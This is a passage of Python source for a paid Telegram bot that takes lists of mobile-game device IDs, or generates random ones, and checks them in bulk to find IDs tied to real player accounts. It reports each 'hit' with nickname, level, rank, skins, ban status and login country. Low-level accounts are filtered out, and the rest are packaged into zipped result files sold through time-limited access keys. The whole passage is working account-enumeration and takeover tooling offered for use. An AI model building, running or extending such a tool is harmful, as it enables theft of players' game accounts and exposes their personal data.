    return "█" * f + "░" * (w - f)

def _fmt_secs(s):
    s = int(max(0, s))
    if s < 60: return f"{s}s"
    m, s = divmod(s, 60)
    if m < 60: return f"{m}m{s}s"
    h, m = divmod(m, 60); return f"{h}h{m}m"

def _stat(icon, label, value, last=False):
    return f"{'┗' if last else '┣'} {icon}  {label:<11}: `{value}`"

def _esc(s): return str(s).replace("`", "'").replace("*", "").replace("_", " ")

def banner():
    return (f"◇  *D E V  I D  C H E C K E R*  ◇\n_{LINE_DOT}_\n"
            f"`⚡ CYBER SCANNER ⚡  v{BOT_VERSION}`\n`⟐  No API · Direct SDP  ⟐`")

def render_welcome(name, is_admin, expiry, checked, hits):
    role = "👑  Admin — unlimited access" if is_admin else f"🎟️  Access until: `{expiry}`"
    return (
        f"{banner()}\n{LINE_HEAVY}\nWelcome, *{_esc(name)}*!\n\n{role}\n\n"
        f"{panel_title('Your Stats')}\n"
        f"{_stat('🔍','Checked', checked)}\n{_stat('🎯','Hits',    hits, last=True)}\n\n"
        f"{panel_title('Available Tools')}\n"
        "┣ 🔥 Bulk Check — send `.txt` of device IDs\n"
        "┣ 🔍 Single Check — one device ID\n"
        "┣ 🎲 Generate + Check — random IDs\n"
        "┣ 📊 Statistics\n"
        "┗ 📖 Help\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

def render_no_key():
    return (
        f"{banner()}\n{LINE_HEAVY}\n🔒  *ACCESS RESTRICTED*\n\n"
        "This bot requires an access key.\n\n"
        f"{panel_title('Pricing')}\n"
        "┣ 💳 3 Days    · ₱50\n┣ 💳 7 Days    · ₱70\n"
        "┣ 💳 1 Month   · ₱100\n┗ 💳 Lifetime  · ₱150\n\n"
        f"📩 Contact admin: {BRAND}\n`/redeem <key>` to activate\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

def render_live(snap, status="RUNNING"):
    total = max(snap["total"], 1); checked = snap["checked"]
    pct = checked / total * 100
    spd = snap.get("speed", 0)
    rem = max(total - checked, 0); eta = snap.get("eta", 0)
    icon = {"RUNNING": "⚡", "STOPPING": "🛑", "FINISHED": "✅"}.get(status, "⚡")
    return (
        f"{icon}  *LIVE SCAN*\n{LINE_HEAVY}\n"
        f"`{_bar(pct, 22)}` *{pct:5.1f}%*\n\n"
        f"{panel_title('Progress')}\n"
        f"{_stat('⏳','Checked', checked)}\n{_stat('⏹','Remain',  rem)}\n"
        f"{_stat('📁','Total',   total)}\n{_stat('⏱','Elapsed', _fmt_secs(snap['elapsed']), last=True)}\n"
        f"\n{panel_title('Results')}\n"
        f"{_stat('✅','Valid',   snap['hits'])}\n{_stat('🚫','Unreg',   snap['invalid'])}\n"
        f"{_stat('🗑','Filtered',snap.get('filtered', 0))}\n"
        f"{_stat('❌','Errors',  snap['errors'], last=True)}\n"
        f"\n{panel_title('Speed')}\n"
        f"┣ ⚡ Rate : `{spd:.1f}/s`\n┗ ⏳ ETA  : `{_fmt_secs(eta)}`\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

def render_summary(snap, sdir):
    el = snap["elapsed"]
    spd = snap["total"] / max(el, 0.001)
    return (
        f"✅  *SCAN COMPLETE*\n{LINE_HEAVY}\n\n{panel_title('Metrics')}\n"
        f"{_stat('✅','Valid',   snap['hits'])}\n{_stat('🚫','Unreg',   snap['invalid'])}\n"
        f"{_stat('🗑','Filtered',snap.get('filtered', 0))}\n"
        f"{_stat('❌','Errors',  snap['errors'])}\n"
        f"{_stat('📁','Total',   snap['total'])}\n"
        f"{_stat('⏱','Time',   _fmt_secs(el))}\n{_stat('⚡','Speed',  f'{spd:.1f}/s', last=True)}\n\n"
        f"{panel_title('Output')}\n"
        f"┣ 📂 Folder : `{os.path.basename(sdir)}/`\n"
        "┣ 📄 all_valid.txt\n┣ 📂 levels/\n┣ 📂 skins/\n┗ 📦 results.zip\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

def render_hit_line(device_id, pd):
    sid = device_id[-10:] if len(device_id) >= 10 else device_id
    nick = _esc(str(pd.get("nickname", "?"))[:20])
    lvl = pd.get("level", "?"); sk = pd.get("skin_count", "?")
    rank = str(pd.get("current_rank", "?"))[:14]
    return f"✅ `…{sid}`  ┃  *{nick}*  ┃  `Lv:{lvl}`  ┃  `🎨{sk}`  ┃  `🏆{rank}`"

# ────────────────────────────────────────────────────────────────
# KEYBOARDS
# ────────────────────────────────────────────────────────────────

def kb_main(admin=False):
    rows = [
        [InlineKeyboardButton("🔥  Bulk Check", callback_data="tool_bulk")],
        [InlineKeyboardButton("🔍  Single Check", callback_data="tool_single")],
        [InlineKeyboardButton("🎲  Generate + Check", callback_data="tool_generate")],
        [InlineKeyboardButton("📊  Statistics", callback_data="tool_stats")],
        [InlineKeyboardButton("💳  Buy Key", callback_data="menu_buy"),
         InlineKeyboardButton("📖  Help", callback_data="menu_help")],
    ]
    if admin:
        rows.append([InlineKeyboardButton("👑  ADMIN PANEL", callback_data="open_admin")])
    return InlineKeyboardMarkup(rows)

def kb_back(admin=False):
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙  Main Menu", callback_data="back_menu")]])

def kb_admin():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Gen Key", callback_data="adm_genkey"),
         InlineKeyboardButton("👥 Users", callback_data="adm_users")],
        [InlineKeyboardButton("📊 Stats", callback_data="adm_stats"),
         InlineKeyboardButton("⚡ Running", callback_data="adm_running")],
        [InlineKeyboardButton("🔙  Main Menu", callback_data="back_menu")],
    ])

# ────────────────────────────────────────────────────────────────
# SAFE EDIT
# ────────────────────────────────────────────────────────────────

async def safe_edit(q, text, parse_mode="Markdown", reply_markup=None):
    try:
        return await q.edit_message_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
    except BadRequest as e:
        if "message is not modified" in str(e).lower(): return None
    except Exception: pass
    try:
        chat_id = q.message.chat_id if q.message else q.from_user.id
        return await q.get_bot().send_message(chat_id=chat_id, text=text,
                                              parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception: return None

async def safe_edit_msg(msg, text, parse_mode="Markdown", reply_markup=None):
    try:
        return await msg.edit_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
    except BadRequest as e:
        if "message is not modified" in str(e).lower(): return None
    except Exception: pass
    try:
        return await msg.reply_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception: return None

# ────────────────────────────────────────────────────────────────
# MEMBERSHIP GATE
# ────────────────────────────────────────────────────────────────

_mc = {}; _mc_lock = threading.Lock(); _MC_TTL = 60.0

async def check_membership(bot, uid):
    if uid == OWNER_ID: return True, []
    now = time.time()
    with _mc_lock:
        c = _mc.get(uid)
        if c and (now - c[0]) < _MC_TTL: return c[1], c[2]
    missing = []
    for ch in REQUIRED_CHANNELS:
        try:
            m = await bot.get_chat_member(chat_id=ch["id"], user_id=uid)
            if m.status in ("left", "kicked"): missing.append(ch["name"])
        except Exception: pass
    ok = (len(missing) == 0)
    with _mc_lock: _mc[uid] = (now, ok, missing)
    return ok, missing

def invalidate_membership(uid):
    with _mc_lock: _mc.pop(uid, None)

def kb_join():
    rows = [[InlineKeyboardButton(f"📢 Join {c['name']}", url=c["url"])] for c in REQUIRED_CHANNELS]
    rows.append([InlineKeyboardButton("✅ I've Joined — Verify", callback_data="verify_join")])
    return InlineKeyboardMarkup(rows)

def render_join(first="there"):
    lines = ["◇  *CHANNEL VERIFICATION REQUIRED*  ◇", LINE_HEAVY, "",
             f"Hey *{_esc(first)}*, join all channels to unlock the bot:", ""]
    for ch in REQUIRED_CHANNELS: lines.append(f"  📢  [{ch['name']}]({ch['url']})")
    lines += ["", LINE_HEAVY, "After joining, tap *✅ I've Joined — Verify*", "", f"👑 {BRAND}"]
    return "\n".join(lines)

async def gate(update, ctx):
    user = update.effective_user
    if user.id == OWNER_ID: return True
    ok, _ = await check_membership(ctx.bot, user.id)
    if ok: return True
    text = render_join(user.first_name or "there"); kb = kb_join()
    if update.callback_query:
        try: await update.callback_query.edit_message_text(text, parse_mode="Markdown", reply_markup=kb)
        except Exception:
            try: await ctx.bot.send_message(chat_id=user.id, text=text, parse_mode="Markdown", reply_markup=kb)
            except Exception: pass
    else:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=kb)
    return False

# ────────────────────────────────────────────────────────────────
# ZIP
# ────────────────────────────────────────────────────────────────

TG_MAX = 49 * 1024 * 1024

def zip_results(folder):
    folder = Path(folder)
    files = sorted([f for f in folder.rglob("*") if f.is_file() and not f.name.endswith(".zip")])
    if not files: return []
    out = folder / "results.zip"
    try:
        with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in files: zf.write(f, f.relative_to(folder))
        if out.stat().st_size <= TG_MAX: return [out]
        out.unlink()
        parts = []; pn = 1; cf = []; cs = 0
        for f in files:
            fs = f.stat().st_size
            if cf and cs + fs > TG_MAX:
                po = folder / f"results_part{pn}.zip"
                with zipfile.ZipFile(po, "w", zipfile.ZIP_DEFLATED) as zf:
                    for x in cf: zf.write(x, x.relative_to(folder))
                parts.append(po); pn += 1; cf = []; cs = 0
            cf.append(f); cs += fs
        if cf:
            po = folder / f"results_part{pn}.zip"
            with zipfile.ZipFile(po, "w", zipfile.ZIP_DEFLATED) as zf:
                for x in cf: zf.write(x, x.relative_to(folder))
            parts.append(po)
        return parts
    except Exception:
        return []

# ────────────────────────────────────────────────────────────────
# JOB RUNNER — shared by bulk & generate
# ────────────────────────────────────────────────────────────────

def _run_scan_job(job, loop, app, devices, tag_prefix):
    user_id = job["user_id"]; chat_id = job["chat_id"]; msg_id = job["msg_id"]
    threads = job["threads"]
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    sdir = os.path.join(RESULTS_DIR, f"{tag_prefix}_{user_id}_{ts}")
    lv_dir = os.path.join(sdir, "levels"); os.makedirs(lv_dir, exist_ok=True)
    sk_dir = os.path.join(sdir, "skins"); os.makedirs(sk_dir, exist_ok=True)
    all_valid = os.path.join(sdir, "all_valid.txt")

    # Optionally save generated list
    if tag_prefix == "gen":
        try:
            with open(os.path.join(sdir, f"generated_{ts}.txt"), "w", encoding="utf-8") as f:
                f.write("\n".join(devices))
        except Exception: pass

    stats = LiveStats(len(devices)); job["stats"] = stats
    stop_event = threading.Event(); job["stop_event"] = stop_event
    file_lock = threading.Lock()
    _last = [0.0]

    def upd(force=False, status="RUNNING"):
        now = time.time()
        if not force and (now - _last[0]) < 1.5: return
        _last[0] = now
        snap = stats.snapshot(); text = render_live(snap, status)
        kb = [[InlineKeyboardButton("🛑  Stop", callback_data=f"stop_{user_id}")]]
        try:
            fut = asyncio.run_coroutine_threadsafe(app.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id, text=text, parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(kb)), loop)
            fut.result(timeout=10)
        except Exception: pass

    import queue as _q
    hq = _q.Queue()
    def hit_sender():
        while True:
            m = hq.get()
            if m is None: break
            for _ in range(3):
                try:
                    fut = asyncio.run_coroutine_threadsafe(
                        app.bot.send_message(chat_id=chat_id, text=m, parse_mode="Markdown"), loop)
                    fut.result(timeout=30); time.sleep(0.4); break
                except Exception: time.sleep(1.5)
    ht = threading.Thread(target=hit_sender, daemon=False); ht.start()

    def worker(did):
        if job.get("stopped") or stop_event.is_set(): return
        res = check_device_id(did)

        if res.get("status") == "success":
            p = res["player_data"]
            try: li = int(p.get("level", 0))
            except Exception: li = 0
            try: sk = int(p.get("skin_count", 0))
            except Exception: sk = 0

            if li < 9:
                stats.inc("checked"); stats.inc("filtered"); upd(); return

            stats.inc("checked"); stats.inc("hits")
            line = _save_line(did, p)
            with file_lock:
                try:
                    with open(all_valid, "a", encoding="utf-8") as f: f.write(line + "\n")
                    lf = _lv_file(lv_dir, li)
                    if lf:
                        with open(lf, "a", encoding="utf-8") as f: f.write(line + "\n")
                    sf = _sk_file(sk_dir, sk)
                    if sf:
                        with open(sf, "a", encoding="utf-8") as f: f.write(line + "\n")
                except Exception: pass
            hq.put(render_hit_line(did, p))
        elif res.get("status") == "unregistered":
            stats.inc("checked"); stats.inc("invalid")
        else:
            stats.inc("checked"); stats.inc("errors")
        upd()

    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futs = [ex.submit(worker, d) for d in devices]
            while True:
                snap = stats.snapshot()
                done = (snap["checked"] >= snap["total"]) or job.get("stopped") or stop_event.is_set()
                upd()
                if done: break
                time.sleep(0.2)
            upd(force=True, status="STOPPING")
            for f in futs: f.cancel()
    except Exception: pass

    hq.put(None); ht.join(timeout=180)

    asyncio.run_coroutine_threadsafe(
        user_manager.update_stats(user_id, checked=stats.checked, hits=stats.hits), loop)

    snap = stats.snapshot()
    summary = render_summary(snap, sdir)
    time.sleep(0.5); edited = False
    for _ in range(3):
        try:
            fut = asyncio.run_coroutine_threadsafe(app.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id, text=summary, parse_mode="Markdown",
                reply_markup=kb_back(user_id == OWNER_ID)), loop)
            fut.result(timeout=30); edited = True; break
        except Exception: time.sleep(1)
    if not edited:
        try:
            asyncio.run_coroutine_threadsafe(
                app.bot.send_message(chat_id=chat_id, text=summary, parse_mode="Markdown",
                                     reply_markup=kb_back(user_id == OWNER_ID)), loop)
        except Exception: pass

    try:
        zips = zip_results(Path(sdir))
        for zp in zips[:3]:
            for _ in range(3):
                try:
                    with open(zp, "rb") as f:
                        fut = asyncio.run_coroutine_threadsafe(app.bot.send_document(
                            chat_id=chat_id, document=f,
                            filename=f"devid_results_{tag_prefix}_{ts}.zip"), loop)
                        fut.result(timeout=60); break
                except Exception: time.sleep(2)
        try: shutil.rmtree(sdir, ignore_errors=True)
        except Exception: pass
    except Exception: pass

    with job_lock: active_jobs.pop(user_id, None)


def run_bulk_job(job, loop, app):
    _run_scan_job(job, loop, app, job["devices"], "session")


def run_generate_job(job, loop, app):
    count = job["count"]
    devices = generate_device_ids(count)
    _run_scan_job(job, loop, app, devices, "gen")

# ────────────────────────────────────────────────────────────────
# COMMANDS
# ────────────────────────────────────────────────────────────────

async def cmd_start(update, ctx):
    uid = update.effective_user.id
    await user_manager.register_user(uid, update.effective_user.username, update.effective_user.first_name)
    if not await gate(update, ctx): return
    auth, _ = await user_manager.is_authorized(uid)
    is_admin = (uid == OWNER_ID)
    if auth:
        ui = await user_manager.get_user_info(uid) or {}
        st = ui.get("stats", {})
        es = ui.get("key_expiry")
        if es:
            try:
                e = datetime.fromisoformat(es)
                ed = "Lifetime" if e.year == 9999 else e.strftime("%Y-%m-%d %H:%M")
            except Exception: ed = "Unknown"
        else: ed = "None"
        await update.message.reply_text(
            render_welcome(update.effective_user.first_name or "friend", is_admin, ed,
                           st.get('total_checked', 0), st.get('total_hits', 0)),
            parse_mode="Markdown", reply_markup=kb_main(admin=is_admin))
    else:
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("💳 Buy Key", callback_data="menu_buy")],
            [InlineKeyboardButton("📖 Help", callback_data="menu_help")]])
        await update.message.reply_text(render_no_key(), parse_mode="Markdown", reply_markup=kb)

async def cmd_redeem(update, ctx):
    uid = update.effective_user.id
    await user_manager.register_user(uid, update.effective_user.username, update.effective_user.first_name)
    if not await gate(update, ctx): return
    if not ctx.args:
        await update.message.reply_text("Usage: `/redeem <key>`", parse_mode="Markdown"); return
    key = ctx.args[0].strip()
    ok, msg = await user_manager.redeem_key(uid, key)
    if ok:
        ui = await user_manager.get_user_info(uid)
        exp = datetime.fromisoformat(ui["key_expiry"])
        await update.message.reply_text(
            f"✅ *KEY REDEEMED*\n{LINE_HEAVY}\n┣ 🔑 Key   : `{key}`\n"
            f"┗ ⏳ Until : `{exp.strftime('%Y-%m-%d %H:%M')}`\n{LINE_HEAVY}\nUse /start.",
            parse_mode="Markdown")
    else:
        await update.message.reply_text(f"❌ {msg}")

async def cmd_help(update, ctx):
    if not await gate(update, ctx): return
    await update.message.reply_text(
        f"◇  *HELP*  ◇\n{LINE_HEAVY}\n"
        "┣ 🔥 Bulk Check — `.txt` file with device IDs\n"
        "┣ 🔍 Single Check — send one device ID\n"
        "┣ 🎲 Generate + Check — random IDs\n"
        "┣ 📊 Statistics — counters\n\n"
        "`/redeem` · `/start` · `/stop` · `/status`\n"
        f"{LINE_HEAVY}\n👑 {BRAND}", parse_mode="Markdown")

async def cmd_stop(update, ctx):
    if not await gate(update, ctx): return
    uid = update.effective_user.id
    stopped = False
    with job_lock:
        job = active_jobs.get(uid)
        if job:
            job["stopped"] = True
            ev = job.get("stop_event")
            if ev: ev.set()
            stopped = True
    await update.message.reply_text("🛑 Stopping…" if stopped else "No active job.")

async def cmd_status(update, ctx):
    if not await gate(update, ctx): return
    uid = update.effective_user.id
    with job_lock: job = active_jobs.get(uid)
    if job and "stats" in job:
        s = job["stats"].snapshot()
        await update.message.reply_text(render_live(s), parse_mode="Markdown")
    else:
        await update.message.reply_text("No active job.")

def admin_only(fn):
    from functools import wraps
    @wraps(fn)
    async def w(update, context):
        if update.effective_user.id != OWNER_ID:
            await update.message.reply_text("❌ Admin only."); return
        return await fn(update, context)
    return w

@admin_only
async def cmd_admin(update, ctx):
    await update.message.reply_text(f"◇  *ADMIN PANEL*  ◇\n{LINE_HEAVY}",
        reply_markup=kb_admin(), parse_mode="Markdown")

@admin_only
async def cmd_genkey(update, ctx):
    args = ctx.args or []
    try:
        dt = args[0].lower()
        if dt == "lifetime": dv = 0; mu = int(args[1]) if len(args) > 1 else 1
        else: dv = int(args[1]); mu = int(args[2])
    except Exception:
        await update.message.reply_text(
            "Usage: `/genkey hours 24 1`\n`/genkey days 7 1`\n"
            "`/genkey months 1 1`\n`/genkey lifetime 1`", parse_mode="Markdown"); return
    keys, _ = await user_manager.generate_key(dv, dt, 1, mu)
    await update.message.reply_text(f"🔑 *KEY*\n{LINE_HEAVY}\n`{keys[0]}`\n{LINE_HEAVY}",
        parse_mode="Markdown")

@admin_only
async def cmd_ban_user(update, ctx):
    if not ctx.args: await update.message.reply_text("Usage: `/ban_user <id>`"); return
    ok = await user_manager.ban_user(int(ctx.args[0].strip()))
    await update.message.reply_text(f"{'✅' if ok else '❌'} `{ctx.args[0]}`")

@admin_only
async def cmd_unban_user(update, ctx):
    if not ctx.args: await update.message.reply_text("Usage: `/unban_user <id>`"); return
    ok = await user_manager.unban_user(int(ctx.args[0].strip()))
    await update.message.reply_text(f"{'✅' if ok else '❌'} `{ctx.args[0]}`")

@admin_only
async def cmd_stats(update, ctx):
    users = await user_manager.get_all_users()
    active = sum(1 for u in users.values() if u.get("activated"))
    banned = sum(1 for u in users.values() if u.get("banned"))
    await update.message.reply_text(
        f"◇  *BOT STATISTICS*  ◇\n{LINE_HEAVY}\n"
        f"┣ 👥 Users   : `{len(users)}`\n┣ ✅ Active  : `{active}`\n"
        f"┗ 🚫 Banned  : `{banned}`\n{LINE_HEAVY}\n👑 {BRAND}",
        parse_mode="Markdown")

# ────────────────────────────────────────────────────────────────
# HANDLERS
# ────────────────────────────────────────────────────────────────

async def handle_document(update, ctx):
    uid = update.effective_user.id
    if not await gate(update, ctx): return
    auth, reason = await user_manager.is_authorized(uid)
    if not auth:
        await update.message.reply_text(f"🚫 Access denied: `{reason}`", parse_mode="Markdown"); return
    with job_lock:
        job = active_jobs.get(uid, {})
        wants_bulk = job.get("awaiting_bulk_file")

    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("Please send a `.txt` file."); return
    f = await ctx.bot.get_file(doc.file_id); data = await f.download_as_bytearray()

    if not wants_bulk:
        await update.message.reply_text("Use /start → 🔥 *Bulk Check* first.", parse_mode="Markdown"); return

    with job_lock:
        if uid in active_jobs and active_jobs[uid].get("status") == "running":
            await update.message.reply_text("⚠️ Job already running."); return

    lines = [l.strip() for l in data.decode(errors="ignore").splitlines() if l.strip() and not l.startswith("#")]
    seen = set(); devices = []
    for d in lines:
        if d not in seen:
            seen.add(d); devices.append(d)
    if not devices:
        await update.message.reply_text("No IDs found."); return

    threads = await user_manager.get_threads_limit(uid)
    pm = await update.message.reply_text(
        f"⚡ *LOADING BULK JOB*\n{LINE_HEAVY}\n┣ 📦 IDs     : `{len(devices)}`\n"
        f"┗ 🧵 Threads : `{threads}`\n{LINE_HEAVY}", parse_mode="Markdown")

    job = {
        "user_id": uid, "chat_id": update.effective_chat.id, "msg_id": pm.message_id,
        "devices": devices, "threads": threads,
        "stopped": False, "checked": 0, "total": len(devices),
        "started": time.time(), "status": "running", "mode": "bulk",
    }
    with job_lock:
        active_jobs[uid] = job
        active_jobs[uid].pop("awaiting_bulk_file", None)
    loop = asyncio.get_event_loop()
    threading.Thread(target=run_bulk_job, args=(job, loop, ctx.application), daemon=True).start()

async def on_text(update, ctx):
    uid = update.effective_user.id
    if not await gate(update, ctx): return
    auth, _ = await user_manager.is_authorized(uid)
    text = update.message.text or ""

    with job_lock:
        job = active_jobs.get(uid, {})
        awaiting_single = job.get("awaiting_single_device")
        awaiting_gen    = job.get("awaiting_gen_count")

    if awaiting_gen and auth:
        with job_lock: active_jobs.get(uid, {}).pop("awaiting_gen_count", None)
        try:
            count = int(text.strip())
            if count < 1 or count > MAX_GENERATE_COUNT: raise ValueError
        except ValueError:
            await update.message.reply_text(
                f"❌ Send a number 1–{MAX_GENERATE_COUNT}.", parse_mode="Markdown"); return

        with job_lock:
            if uid in active_jobs and active_jobs[uid].get("status") == "running":
                await update.message.reply_text("⚠️ Job already running."); return

        threads = await user_manager.get_threads_limit(uid)
        pm = await update.message.reply_text(
            f"🎲 *GENERATE + CHECK*\n{LINE_HEAVY}\n"
            f"┣ 🎯 Count   : `{count}`\n┗ 🧵 Threads : `{threads}`\n{LINE_HEAVY}",
            parse_mode="Markdown")

        job = {
            "user_id": uid, "chat_id": update.effective_chat.id, "msg_id": pm.message_id,
            "count": count, "threads": threads,
            "stopped": False, "checked": 0, "total": count,
            "started": time.time(), "status": "running", "mode": "generate",
        }
        with job_lock: active_jobs[uid] = job
        loop = asyncio.get_event_loop()
        threading.Thread(target=run_generate_job, args=(job, loop, ctx.application), daemon=True).start()
        return

    if awaiting_single and auth:
        did = text.strip()
        with job_lock:
            active_jobs.get(uid, {}).pop("awaiting_single_device", None)
            if not active_jobs.get(uid): active_jobs.pop(uid, None)
        is_admin = (uid == OWNER_ID)

        msg = await update.message.reply_text(
            f"🔍 *SINGLE CHECK*\n{LINE_HEAVY}\n`{did}`\n_This may take up to 30s…_\n{LINE_HEAVY}",
            parse_mode="Markdown")

        res = await asyncio.to_thread(check_device_id, did)

        if res.get("status") == "error":
            await safe_edit_msg(msg,
                f"❌ *CHECK ERROR*\n{LINE_HEAVY}\n┣ 🆔 Device : `{did}`\n"
                f"┗ ⚠️ Reason : `{res.get('error', 'Unknown')}`\n{LINE_HEAVY}\n👑 {BRAND}",
                reply_markup=kb_back(is_admin))
            await user_manager.update_stats(uid, checked=1, hits=0); return

        if res.get("status") == "unregistered":
            await safe_edit_msg(msg,
                f"🚫 *UNREGISTERED*\n{LINE_HEAVY}\n┣ 🆔 Device : `{did}`\n"
                f"┗ ⚠️ No real account bound to this device\n{LINE_HEAVY}\n👑 {BRAND}",
                reply_markup=kb_back(is_admin))
            await user_manager.update_stats(uid, checked=1, hits=0); return

        pd = res.get("player_data", {}) or {}
        lm = pd.get("last_match") or {}
        lh = lm.get("hero_name", "—")
        prev = lm.get("prev") or []
        prev_s = ", ".join(str(h) for h in prev[:5]) if prev else "—"
        card = (
            f"✅ *HIT FOUND*\n{LINE_HEAVY}\n"
            f"{panel_title('Identity')}\n"
            f"┣ 🆔 Device : `{did}`\n"
            f"┣ 🎮 Acc    : `{pd.get('player_id', '—')}`\n"
            f"┣ 🌐 Zone   : `{pd.get('server', '—')}`\n"
            f"┣ 🏷 Nick   : *{_esc(pd.get('nickname', '—'))}*\n"
            f"┗ 📈 Level  : `{pd.get('level', '—')}`\n"
            f"\n{panel_title('Ranks')}\n"
            f"┣ 🏆 Current: `{pd.get('current_rank', '—')}`\n"
            f"┣ ⭐ High   : `{pd.get('high_rank', '—')}`\n"
            f"┣ 💠 Collector: `{pd.get('collector_tier', '—')}`\n"
            f"┗ 💎 Points : `{pd.get('collector_point', 0):,}`\n"
            f"\n{panel_title('Collection')}\n"
            f"┣ 🦸 Heroes : `{pd.get('hero_count', '—')}`\n"
            f"┣ 🎨 Skins  : `{pd.get('skin_count', '—')}`\n"
            f"┗ 🎯 Affinity: `{pd.get('affinity', '—')}`\n"
            f"\n{panel_title('Account')}\n"
            f"┣ 🚫 Ban    : `{pd.get('ban_status', 'Not Banned')}`\n"
            f"┣ 🎯 WR     : `{pd.get('win_rate', '—')}`\n"
            f"┣ 🏅 Battles: `{pd.get('total_battles', 0):,}`\n"
            f"┣ 📍 Loc    : `{pd.get('location', '—')}`\n"
            f"┣ ⏰ Login  : `{pd.get('last_login', '—')}`\n"
            f"┣ 🌍 Country: `{pd.get('last_login_country', '—')}`\n"
            f"┣ 👥 Squad  : `{pd.get('squad', '—')}`\n"
            f"┗ 🗺 Reg    : `{pd.get('create_country', '—')}`\n"
            f"\n{panel_title('Recent Heroes')}\n"
            f"┣ 🎮 Last   : `{lh}`\n"
            f"┗ 🕹 Prev   : `{prev_s}`\n"
            f"\n{LINE_DOT}\n👑 {BRAND}"
        )
        await safe_edit_msg(msg, card, reply_markup=kb_back(is_admin))
        await user_manager.update_stats(uid, checked=1, hits=1)
        return

async def handle_callback(update, ctx):
    q = update.callback_query
    try: await q.answer()
    except Exception: pass
    data = q.data or ""
    uid = update.effective_user.id
    is_admin = (uid == OWNER_ID)

    try:
        if data == "verify_join":
            invalidate_membership(uid)
            ok, missing = await check_membership(ctx.bot, uid)
            if ok: await safe_edit(q, "✅ *Verified!* Tap /start.", reply_markup=None)
            else:
                ml = "\n".join(f"  • {m}" for m in missing)
                await safe_edit(q, f"⚠️ Still missing:\n{ml}", reply_markup=kb_join())
            return

        if data == "back_menu":
            auth, _ = await user_manager.is_authorized(uid)
            if not auth:
                await safe_edit(q, render_no_key(),
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("💳 Buy", callback_data="menu_buy"),
                         InlineKeyboardButton("📖 Help", callback_data="menu_help")]]))
                return
            ui = await user_manager.get_user_info(uid) or {}
            st = ui.get("stats", {}); es = ui.get("key_expiry")
            if es:
                try:
                    e = datetime.fromisoformat(es)
                    ed = "Lifetime" if e.year == 9999 else e.strftime("%Y-%m-%d %H:%M")
                except Exception: ed = "Unknown"
            else: ed = "None"
            await safe_edit(q, render_welcome(
                    update.effective_user.first_name or "friend", is_admin, ed,
                    st.get("total_checked", 0), st.get("total_hits", 0)),
                reply_markup=kb_main(admin=is_admin))
            return

        if uid != OWNER_ID:
            ok, _ = await check_membership(ctx.bot, uid)
            if not ok:
                await safe_edit(q, render_join(update.effective_user.first_name or "there"),
                    reply_markup=kb_join())
                return

        if data == "tool_bulk":
            auth, r = await user_manager.is_authorized(uid)
            if not auth: await safe_edit(q, f"🚫 Access denied: `{r}`"); return
            with job_lock:
                if uid not in active_jobs: active_jobs[uid] = {}
                active_jobs[uid]["awaiting_bulk_file"] = True
            await safe_edit(q,
                f"📤 *BULK CHECK MODE*\n{LINE_HEAVY}\n"
                "Send a `.txt` file — one Device ID per line.\n"
                f"{LINE_HEAVY}\n👑 {BRAND}",
                reply_markup=kb_back(is_admin)); return

        if data == "tool_single":
            auth, r = await user_manager.is_authorized(uid)
            if not auth: await safe_edit(q, f"🚫 Access denied: `{r}`"); return
            with job_lock:
                if uid not in active_jobs: active_jobs[uid] = {}
                active_jobs[uid]["awaiting_single_device"] = True
            await safe_edit(q,
                f"🔍 *SINGLE CHECK MODE*\n{LINE_HEAVY}\n"
                "Send one Device ID as text.\n"
                f"{LINE_HEAVY}\n👑 {BRAND}",
                reply_markup=kb_back(is_admin)); return

        if data == "tool_generate":
            auth, r = await user_manager.is_authorized(uid)
            if not auth: await safe_edit(q, f"🚫 Access denied: `{r}`"); return
            with job_lock:
                if uid not in active_jobs: active_jobs[uid] = {}
                active_jobs[uid]["awaiting_gen_count"] = True
            await safe_edit(q,
                f"🎲 *GENERATE + CHECK*\n{LINE_HEAVY}\n"
                f"┣ 🔢 Range   : `1 - {MAX_GENERATE_COUNT:,}`\n"
                f"┗ 📝 Action  : send a number\n{LINE_HEAVY}\n👑 {BRAND}",
                reply_markup=kb_back(is_admin)); return

        if data == "tool_stats":
            ui = await user_manager.get_user_info(uid) or {}
            st = ui.get("stats", {})
            await safe_edit(q,
                f"◇ *YOUR STATS* ◇\n{LINE_HEAVY}\n"
                f"┣ 🔍 Checked : `{st.get('total_checked', 0):,}`\n"
                f"┗ 🎯 Hits    : `{st.get('total_hits', 0):,}`\n{LINE_HEAVY}\n👑 {BRAND}",
                reply_markup=kb_back(is_admin)); return

        if data == "menu_buy":
            await safe_edit(q,
                f"💳 *GET ACCESS*\n{LINE_HEAVY}\n"
                "┣ 3 Days     · ₱50\n┣ 7 Days     · ₱70\n"
                "┣ 1 Month    · ₱100\n┗ Lifetime   · ₱150\n"
                f"{LINE_HEAVY}\n📩 {BRAND}",
                reply_markup=kb_back(is_admin)); return

        if data == "menu_help":
            await safe_edit(q,
                f"◇ *HELP* ◇\n{LINE_HEAVY}\n"
                "┣ 🔥 Bulk Check — `.txt` file\n"
                "┣ 🔍 Single Check — one ID\n"
                "┣ 🎲 Generate + Check\n"
                "┣ 📊 Statistics\n\n"
                "`/redeem` · `/start` · `/stop`\n"
                f"{LINE_HEAVY}\n👑 {BRAND}",
                reply_markup=kb_back(is_admin)); return

        if data.startswith("stop_"):
            try: target = int(data.split("_")[1])
            except Exception: return
            if uid == target or uid == OWNER_ID:
                with job_lock:
                    if target in active_jobs:
                        active_jobs[target]["stopped"] = True
